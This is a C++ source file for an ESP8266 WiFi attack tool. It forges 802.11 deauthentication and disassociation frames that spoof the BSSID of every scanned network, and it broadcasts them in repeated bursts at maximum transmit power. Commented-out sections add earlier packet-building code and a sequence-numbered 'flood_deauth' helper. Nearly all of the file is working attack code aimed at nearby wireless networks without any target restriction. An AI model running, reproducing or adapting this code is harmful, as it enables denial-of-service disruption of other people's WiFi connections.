#include "Attacker.h"

#include "debug.h"

unsigned i = 0;

Attacker attacker;

void Attacker::Start(const AttackSettings &s)
{
    settings = s;
    wifi.StopPromiscuous();

    WiFi.mode(WIFI_STA);
    wifi_set_opmode_current(STATION_MODE);
    wifi_register_send_pkt_freedom_cb(Attacker::PacketCallback);
    active = true;

    // memcpy(deauthpkt + DEAUTH_PACKET_RECEIVER_OFFSET, mac::BROADCAST, mac::LENGTH); // for now deauth all
    startTime = millis();

    debuglnF("[Attacker] Attack Started");
}

void Attacker::Update()
{
    if(!active) return;
    elapsedTime = millis();
    uint8_t pkt[26];
    
    wifi_deauth_pkt_t deauth;
    deauth.frame_ctrl.type = wifi_promiscuous_pkt_type_t::WIFI_PKT_MGMT;
    deauth.frame_ctrl.subtype = wifi_mgmt_subtypes_t::DEAUTHENTICATION;
    deauth.duration_id = 0;
    deauth.fragment_counter = 0;

    yield();

    if((elapsedTime - startTime) >= settings.timeout)
    {
        Stop();
        return;
    }
    for(const auto &target : scanner.FoundNetworks())
    {
        // memcpy(deauthpkt + DEAUTH_PACKET_SENDER_OFFSET, target.bssid, mac::LENGTH);
        // memcpy(deauthpkt + DEAUTH_PACKET_BSSID_OFFSET, target.bssid, mac::LENGTH);
        debugfP("[Attacker] Attacking %s, Mac: %s\r\n", target.GetSSID().c_str(), str::mac(target.bssid).c_str());
        /*
        pkt[0] = 0xc0;
        memcpy_P(&pkt[1], &deauth_pkt[1], 3);
        memcpy(&pkt[4], mac::BROADCAST, 6);
        memcpy(&pkt[10], target.bssid, 6);
        memcpy(&pkt[16], target.bssid, 6);
        memcpy_P(&pkt[22], &deauth_pkt[22], 4);
        pkt[24] = 0x02;

        deauthpkt[0] = 0xC0;
        sys::send_to(target.channel, pkt, DEAUTH_PACKET_SIZE);
        deauthpkt[0] = 0xA0;
        sys::send_to(target.channel, pkt, DEAUTH_PACKET_SIZE);
        */
       WiFi.setOutputPower(20.5F);
       sys::channel(target.channel);
       memcpy(&deauth.receiver, mac::BROADCAST, 6);
       memcpy(&deauth.sender, target.bssid, 6);
       memcpy(&deauth.bssid, target.bssid, 6);
       deauth.reason = 2;

        for(int j = 0; j < 16; ++j)
        {
            yield();
            deauth.sequence_number = (i++) & 0xFFF;
            deauth.frame_ctrl.subtype = wifi_mgmt_subtypes_t::DEAUTHENTICATION;
            sys::send(reinterpret_cast<const byte*>(&deauth), 26);
            deauth.frame_ctrl.subtype = wifi_mgmt_subtypes_t::DISASSOCIATION;
            sys::send(reinterpret_cast<const byte*>(&deauth), 26);
        }
    }

    debuglnF("[Attacker] Updated Attack");
}

void Attacker::Stop()
{
    if(!active) return;
    active = false;

    wifi_set_opmode_current(wifi_get_opmode_default());
    debuglnF("[Attacker] Attack Stopped");
}

void Attacker::DeauthTarget(const Target &target)
{
    byte deauthpkt[DEAUTH_PACKET_SIZE] = {
        DEAUTH_PACKET_BYTES
    };

    memcpy(deauthpkt + DEAUTH_PACKET_RECEIVER_OFFSET, target.receiver, mac::LENGTH);
}

/*
uint16_t seq_num = 0x4D2;               // 12-bit sequence number
uint16_t frag_num = 0;                  // usually zero
uint16_t seq_control = (seq_num << 4) | frag_num; // 0x4D20

uint8_t sc_bytes[2];
sc_bytes[0] = seq_control & 0xFF;       // LSB sent first
sc_bytes[1] = (seq_control >> 8) & 0xFF;

// Now insert sc_bytes into your MAC header buffer at the correct offset


#include <stdint.h>

// Convenient struct for MAC header (simplified to relevant parts)
struct DeauthFrame {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t seq_ctrl[2];
    uint8_t reason_code[2];
};

void set_sequence_control(uint8_t *seq_ctrl_bytes, uint16_t seq_num, uint8_t frag_num = 0) {
    uint16_t sc = ((seq_num & 0x0FFF) << 4) | (frag_num & 0x0F);
    seq_ctrl_bytes[0] = sc & 0xFF;        // LSB
    seq_ctrl_bytes[1] = (sc >> 8) & 0xFF; // MSB
}

void flood_deauth(uint8_t *buf, uint8_t *dst_mac, uint8_t *src_mac, uint8_t *bssid_mac, uint16_t start_seq) {
    const uint16_t flood_count = 16;
    DeauthFrame *frame = reinterpret_cast<DeauthFrame*>(buf);

    // Prepare static values (frame control, duration, addresses, reason code)
    // ...

    for (uint16_t i = 0; i < flood_count; ++i) {
        uint16_t seq_num = (start_seq + i) & 0x0FFF; // wrap around at 4096
        set_sequence_control(frame->seq_ctrl, seq_num);

        // Send packet (size is sizeof(DeauthFrame))
        wifi_send_pkt_freedom(buf, sizeof(DeauthFrame), 0);
        delay(1); // small pause to avoid overwhelming
    }
}

*/